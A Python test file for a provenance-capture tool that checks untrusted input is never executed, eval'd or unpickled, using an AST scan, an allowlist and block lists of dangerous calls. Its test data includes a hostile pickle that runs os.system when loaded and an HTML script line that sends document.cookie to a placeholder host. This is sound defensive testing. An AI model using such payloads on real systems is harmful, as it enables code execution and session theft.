"""SEC-11 (K.12.6, T-10): nothing from the untrusted zone is executed, imported, ``eval``'d or unpickled.

``test_ingest_static.py`` holds the strict rules for ``ingest/`` (no ``splitlines``, no platform branching, YAML only in
``yamlsafe``). This file widens the dangerous-construct scan to every shipped Python module of the core, the capture
library and the shared backend harness, with an explicit, reasoned allowlist, and checks the run-time side: a pickle
in the input tree is stored and registered, never loaded; generic ``artefact`` content is never decoded.
"""

from __future__ import annotations

import ast
import pickle
from pathlib import Path

import agentdojo_support as ad
import pytest
from import_harness import run_import

from agentprov.raw.store import ext_for_media

ROOT = Path(__file__).resolve().parents[2]
SCANNED = ("src/agentprov", "capture/src", "backends/shared/src", "backends/inspect/src")
FORBIDDEN_IMPORTS = {"pickle", "marshal", "shelve", "dill", "joblib", "cloudpickle", "tarfile"}
FORBIDDEN_NAMES = {"eval", "exec", "__import__", "literal_eval", "load_dotenv"}
FORBIDDEN_ATTRS = {"extract", "extractall", "unpack_archive", "popen", "entry_points", "load_dotenv", "unsafe_load",
                   "full_load", "FullLoader", "UnsafeLoader", "literal_eval", "startfile", "spawnv", "execv", "execve"}
#: (path, construct) -> why it is acceptable. Every entry is reviewed; a new hit fails the test.
ALLOWED = {
    ("src/agentprov/io/worker_testjobs.py", "os.system"):
        "test-only job kinds that prove the T1 audit hook blocks a subprocess event (G.4.4, SEC-22)",
    ("src/agentprov/io/worker_testjobs.py", "os.execv"): "the same audit-hook proof for exec",
    ("src/agentprov/prov/compat/adprov_v2_3/conformance.py", "__import__"):
        "frozen compat port (invariant 8): probes whether prov/rdflib are installed; the module name is a literal",
    ("backends/shared/src/agentprov_backend/executor_mirror.py", "literal_eval"):
        "T2 only: mirrors AgentDojo 0.1.35 ToolsExecutor.query byte for byte (source-hash pinned; upstream parity)",
}
#: Modules that may start processes (G.11 #15 plus the probes), and why.
SUBPROCESS_MODULES = {
    "src/agentprov/io/workers.py": "spawns the T1 worker pool",
    "src/agentprov/io/worker_testjobs.py": "test-only job kinds for the audit hook",
    "src/agentprov/keys/__init__.py": "starts the keychain helper process (this interpreter, -I, a fixed module; D-702)",
    "src/agentprov/jobs/manager.py": "starts a job's supervisor (this interpreter, -I, agentprov.jobs.supervisor; D-704)",
    "src/agentprov/jobs/supervisor.py": "starts the job's argv: this interpreter's agentprov or a resolved tools/*.py (D-704)",
    "src/agentprov/host.py": "host capability probes (D-7)",
    "src/agentprov/raw/fetch.py": "hardened bare git fetch (G.7.5)",
    "src/agentprov/cli/backends.py": "uv sync at backend build time (M.5.3)",
    "src/agentprov/cli/live/worker.py": "execs the backend interpreter (T2)",
    "src/agentprov/cli/live/sandbox.py": "the sandbox-exec probe and wrapper (AD-13(b))",
    "src/agentprov/render/dot.py": "Graphviz dot, fixed argv (G.8.6)",
    "src/agentprov/migration/gates.py": "gate G0 runs the frozen baseline environment (J.1.6)",
    "src/agentprov/cli/gitinfo.py": "git rev-parse/status for the sealing and building commits (H.2.7, D-780; moved from "
                                    "cli/package.py), and the G3 output guard's check-ignore",
}


def _modules() -> list[Path]:
    return sorted(p for root in SCANNED for p in (ROOT / root).rglob("*.py"))


def _hits(path: Path) -> list[str]:
    found = []
    for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"), filename=str(path))):
        if isinstance(node, ast.Import):
            found += [f"import {a.name}" for a in node.names if a.name.split(".")[0] in FORBIDDEN_IMPORTS]
        elif isinstance(node, ast.ImportFrom) and node.module:
            if node.module.split(".")[0] in FORBIDDEN_IMPORTS:
                found.append(f"from {node.module}")
        elif isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name) and node.func.id in FORBIDDEN_NAMES:
                found.append(node.func.id)
            if isinstance(node.func, ast.Name) and node.func.id == "compile" and not _literal(node):
                found.append("compile")
            if any(kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value for kw in node.keywords):
                found.append("shell=True")
        elif isinstance(node, ast.Attribute):
            base = node.value.id if isinstance(node.value, ast.Name) else ""
            if node.attr in FORBIDDEN_ATTRS or (node.attr == "system" and base == "os"):
                found.append(f"{base}.{node.attr}" if base else node.attr)
    return [h.split(".")[-1] if h.endswith("literal_eval") else h for h in found]


def _literal(call: ast.Call) -> bool:
    return bool(call.args) and isinstance(call.args[0], ast.Constant)


def test_sec11_the_scan_covers_the_core_capture_and_backend_harness() -> None:
    names = {p.relative_to(ROOT).as_posix() for p in _modules()}
    assert "src/agentprov/ingest/loaders.py" in names and "capture/src/agentprov_capture/redact.py" in names
    assert any(n.startswith("backends/shared/src/agentprov_backend/") for n in names)


def test_sec11_no_dangerous_construct_outside_the_reviewed_allowlist() -> None:
    hits = {(p.relative_to(ROOT).as_posix(), h) for p in _modules() for h in _hits(p)}
    assert sorted(hits - set(ALLOWED)) == []
    assert sorted(set(ALLOWED) - hits) == [], "an allowlist entry no longer matches: remove it"


def test_sec11_only_the_reviewed_modules_import_subprocess() -> None:
    importers = set()
    for path in _modules():
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            if (isinstance(node, ast.Import) and any(a.name == "subprocess" for a in node.names)) or (
                    isinstance(node, ast.ImportFrom) and node.module == "subprocess"):
                importers.add(path.relative_to(ROOT).as_posix())
    assert importers <= set(SUBPROCESS_MODULES), sorted(importers - set(SUBPROCESS_MODULES))


# ------------------------------------------------------------------------------------------------ run time
#: A protocol-0 pickle whose loading would run ``os.system``; it is data here and must stay data.
HOSTILE_PICKLE = b"cos\nsystem\n(S'touch PWNED'\ntR."


def test_sec11_a_pickle_in_the_input_tree_is_stored_and_registered_never_loaded(
        tmp_path: Path, monkeypatch: pytest.MonkeyPatch, cwd_guard: Path) -> None:
    def refuse(*_a: object, **_k: object) -> object:
        raise AssertionError("an unpickler or marshal loader ran on input bytes")

    for name in ("loads", "load", "Unpickler"):  # marshal stays: the import system itself loads bytecode with it
        monkeypatch.setattr(pickle, name, refuse)
    doc = ad.base_log()
    imported = run_import(tmp_path, {ad.path_of(doc): ad.log_bytes(doc),
                                     "runs/m/banking/user_task_1/none/none.json": HOSTILE_PICKLE,
                                     "runs/m/banking/user_task_1/none/state.pkl": HOSTILE_PICKLE})
    # the log maps; the pickle at a task path is not JSON: a degenerate AER since D-219 (task id not captured)
    assert imported.report.counters["mapped"] - imported.report.counters["degenerate"] == 1
    codes = {r["code"] for r in imported.rows("register.jsonl")}
    # registered, never silently dropped
    assert codes & {"map.unparseable_artefact", "map.adapter_defect", "select.not_execution_artefact"}
    stored = {r["sha256"] for r in imported.rows("raw/origins.jsonl")}
    import hashlib

    assert "sha256:" + hashlib.sha256(HOSTILE_PICKLE).hexdigest() in stored  # store-first: kept as bytes
    assert not any(p.name == "PWNED" for p in tmp_path.rglob("*"))
    for obj in (imported.partial / "raw" / "objects").rglob("*"):
        if obj.is_file():
            assert not obj.stat().st_mode & 0o111  # never executable


@pytest.mark.parametrize("media", ["text/html", "image/png", "image/svg+xml", "application/x-python-pickle",
                                   "application/javascript", "TEXT/HTML; charset=utf-8", "../../x"])
def test_sec11_a_media_claim_never_selects_a_parser_or_an_executable_name(media: str) -> None:
    ext = ext_for_media(media)
    assert ext in {"bin", "json", "jsonl", "txt", "zip", "eval", "png"} and "/" not in ext and ext.isalnum()


def test_sec11_artefact_content_with_active_media_is_validated_as_data() -> None:
    from aer_support import codes_of, example_records, insert_after, validate_example

    script = {"k": "artefact", "id": "af0", "ev": "D", "rule": ["tst.d@1"], "type": "tst:note",
              "content": "<script>fetch('https://x.invalid/'+document.cookie)</script>", "media": "text/html",
              "generated_by": "ac0"}
    activity = {"k": "activity", "id": "ac0", "ev": "D", "rule": ["tst.d@1"], "type": "tst:plan", "actor": "agent",
                "scope": "att0", "inputs": ["m0"], "status": "ok", "label": "plan"}
    records = insert_after(insert_after(example_records(), "m0", activity), "ac0", script)
    assert codes_of(validate_example(records)) == []  # stored as a string; the media value is a recorded claim
